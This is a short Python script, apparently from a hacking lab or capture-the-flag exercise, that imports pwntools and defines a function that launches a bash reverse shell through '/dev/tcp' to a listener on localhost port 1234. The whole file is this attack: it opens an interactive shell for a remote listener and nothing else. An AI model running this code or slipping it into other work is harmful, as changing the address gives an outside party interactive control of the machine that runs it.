#!/usr/bin/python3


import subprocess
import sys
from pwn import *


def get_reverse_shell():

    output = subprocess.Popen('bash -c "bash -i >& /dev/tcp/127.0.0.1/1234 0>&1"', shell=True, stdout=subprocess.PIPE)

    (conn, err) = output.communicate()
    return 



def main():
    get_reverse_shell()


if __name__ == "__main__":
    main()